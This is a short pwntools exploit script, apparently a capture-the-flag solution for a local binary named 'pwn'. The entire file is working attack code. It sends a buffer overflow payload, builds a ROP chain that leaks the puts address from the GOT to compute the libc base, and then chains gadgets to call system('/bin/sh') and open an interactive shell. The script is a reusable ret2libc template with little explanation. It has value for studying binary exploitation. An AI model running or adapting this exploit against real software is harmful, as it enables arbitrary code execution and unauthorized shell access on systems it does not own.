#!/bin/python3

from pwn import *

l = ELF('/lib/x86_64-linux-gnu/libc.so.6') 
p = process('./pwn')
e = ELF('./pwn')
r = ROP('./pwn')

offset = 0x7ffdfaaf9a98 - 0x7ffdfaaf9a80

p.recvuntil(b'name?\n')

payload = b'A'*offset
payload += p64(r.find_gadget(['pop rdi', 'ret']).address)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(e.sym['main'])

p.sendline(payload)

p.recvuntil(b'Hello there: \n')

leak = p.recv()

libc_puts_leaked = leak.split(b'\n')[1]
libc_puts_leaked = u64(libc_puts_leaked + b'\x00'*(8 - len(libc_puts_leaked)))
log.info(f'Found puts address: {hex(libc_puts_leaked)}')


libc_puts_offset = l.sym['puts']

libc_base = libc_puts_leaked - libc_puts_offset


log.info(f'Libc Base: {hex(libc_base)}')
if hex(libc_base)[-3:] != '000':
    log.info('Libc base hex addr should be aligned to a 0x1000 pagesize')
    log.failure('Libc base is not correct! Exiting now')
    p.close()
    exit()
else:
    log.info('Libc Base address looks correct!')


system_offset = l.sym['system']
system_addr = libc_base + system_offset

binsh_offset = next(l.search(b'/bin/sh'))
binsh_addr = libc_base + binsh_offset


# basic ropchain
payload = b'A'*offset
payload += p64(r.find_gadget(['ret']).address)  # align stack
payload += p64(r.find_gadget(['pop rdi', 'ret']).address) # pop rdi
payload += p64(binsh_addr)  # put '/bin/sh' into rdi to use as arg for system()
payload += p64(system_addr) # call system using arg, which is in rdi


p.sendline(payload)

p.interactive()
